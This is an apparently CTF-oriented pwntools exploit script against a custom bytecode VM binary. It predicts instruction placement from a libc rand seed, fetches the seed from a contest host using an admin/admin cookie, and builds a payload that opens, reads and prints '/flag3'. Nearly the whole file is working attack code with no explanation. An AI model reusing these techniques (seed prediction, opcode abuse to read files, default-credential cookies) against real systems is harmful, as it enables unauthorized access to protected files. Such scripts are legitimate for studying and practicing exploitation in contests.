# Please place "/flag3" first.
from pwn import *
import ctypes
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vm'

elf = ELF(TARGET)
def start(seed):
	return process([TARGET, str(seed)])

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def get_seed():
	import requests
	import base64
	import struct
	idx =1000
    	r = requests.get("http://router-mlb4ta7v3lwam.shellweplayaga.me:31337/ping?id={}".format(idx%2**64), headers={"Cookie": "password=admin; username=admin"})
    	chunk = base64.b64decode(r.json()["result"]).ljust(4096, b"\x00")
	seed = struct.unpack("<I", chunk[:4])[0]
	return seed

#seed = get_seed()

# for testing
seed = 1111111111

r = start(seed)
if args.D:
	#debug(r, [0x1640,0x1770, 0x16d0, 0x17f0, 0x1890, 0x1a2b, 0x1aa0])
	#debug(r, [0x1aa0, 0x1b70, 0x1c20, 0x1c57, 0x1db0])
	debug(r, [0x1c20, 0x1a2b, 0x1afd, 0x1b70])
	#debug(r, [0x1890, 0x1c5c, 0x1a2b])
LIBC.srand(seed)
ips = [0]
for i in range(0x100):
	ips.append(LIBC.rand() & 0xfff)
dups = []
for i in ips:
	cnt = 0
	for j in ips:
		if i==j:
			cnt +=1
	if cnt !=1:
		dups.append(i)

print dups
payload = [0xaa] *0x1000

# Commands
# \x01\x[00-02]\xXX:		reg[00-02] = reg[00-02] << 8 | XX
# \x02\x[00-02]:		reg[00-02] = 0
# \x03\x[00-02]\x[00-02]:	mov dst, src
# \x04\xXX\xYY\x[00-02]: 	mov mem[0xXXYY//8] = reg[00-02]
# \x1e: open(mem[reg0], 0)
# \x1f: read(reg0, mem[reg1], reg2)
# \x21: write(1?, mem[reg0], reg2)# with putchar
# \x65: sub

cnt = 0
def check_cnt():
	global cnt
	global dups
	if ips[cnt] in dups:
		payload[ips[cnt]+0] = 0x3
		payload[ips[cnt]+1] = 0x1
		payload[ips[cnt]+2] = 0x1
		cnt+=1
	return

def input_filename(name):
	global cnt
	
	check_cnt()
	payload[ips[cnt]] = 0x2
	payload[ips[cnt]+1] = 0x1
	cnt+=1

	check_cnt()
	payload[ips[cnt]] = 0x1
	payload[ips[cnt]+1] = 0x2
	payload[ips[cnt]+2] = 0x30
	cnt += 1

	for i in range(len(name)):
		if ord(name[i]) > 0x60 and ord(name[i]) < 0x70:
			check_cnt()
			payload[ips[cnt]] = 1
			payload[ips[cnt]+1] = 0
			payload[ips[cnt]+2] = ord(name[i])+0x30
			cnt += 1

			check_cnt()
			payload[ips[cnt]] = 0x65
			payload[ips[cnt]+1] = 0x0
			payload[ips[cnt]+2] = 0x2
			cnt += 1
		else:
			check_cnt()
			payload[ips[cnt]] = 1
			payload[ips[cnt]+1] = 0
			payload[ips[cnt]+2] = ord(name[i])
			cnt += 1

		check_cnt()
		payload[ips[cnt]] = 4
		payload[ips[cnt]+1] = 0x10
		payload[ips[cnt]+2] = 0x10+i
		payload[ips[cnt]+3] = 0
		cnt += 1


input_filename("flag3\x00")
check_cnt()

# clear r0, r1, r2
payload[ips[cnt]] = 0x2
payload[ips[cnt]+1] = 0x0
cnt+=1

check_cnt()
payload[ips[cnt]] = 0x2
payload[ips[cnt]+1] = 0x1
cnt+=1

check_cnt()
payload[ips[cnt]] = 0x2
payload[ips[cnt]+1] = 0x2
cnt+=1

# make "\x00dog"
check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x2
payload[ips[cnt]+2] = 0x30
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x67+0x30
cnt += 1


check_cnt()
payload[ips[cnt]] = 0x65
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x2
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x6f+0x30
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x65
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x2
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x64+0x30
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x65
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x2
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x0
cnt += 1

# make "\x01dog"
check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x1
payload[ips[cnt]+2] = 0x67+0x30
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x65
payload[ips[cnt]+1] = 0x1
payload[ips[cnt]+2] = 0x2
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x1
payload[ips[cnt]+2] = 0x6f+0x30
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x65
payload[ips[cnt]+1] = 0x1
payload[ips[cnt]+2] = 0x2
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x1
payload[ips[cnt]+2] = 0x64+0x30
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x65
payload[ips[cnt]+1] = 0x1
payload[ips[cnt]+2] = 0x2
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x1
payload[ips[cnt]+2] = 0x1
cnt += 1

# for enabling 0x4050cc = 1
check_cnt()
payload[ips[cnt]] = 0x22
cnt+=1

# open("/flag3", 0)
check_cnt()
payload[ips[cnt]] = 0x2
payload[ips[cnt]+1] = 0x0
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x10
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x10
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1e
cnt+=1

# read(fd, &mem[0x1010], 0xff)
check_cnt()
payload[ips[cnt]] = 0x2
payload[ips[cnt]+1] = 0x2
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x2
payload[ips[cnt]+2] = 0x10
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x2
payload[ips[cnt]+2] = 0x10
cnt += 1


check_cnt()
payload[ips[cnt]] = 0x2
payload[ips[cnt]+1] = 0x1
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x1
payload[ips[cnt]+2] = 0xff
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1f
cnt+=1

# putchar(&mem[0x1010])
check_cnt()
payload[ips[cnt]] = 0x2
payload[ips[cnt]+1] = 0x0
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x10
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x1
payload[ips[cnt]+1] = 0x0
payload[ips[cnt]+2] = 0x10
cnt += 1

check_cnt()
payload[ips[cnt]] = 0x21
cnt+=1

# for pass command 0x22
payload[0xfff] = 0x61+9


# create binary for upload
payload = ''.join([chr(p) for p in payload])
#with open('./eatthis', 'wb') as f:
	#f.write(payload)

# test binary at local
r.sendline(payload)

r.interactive()
r.close()

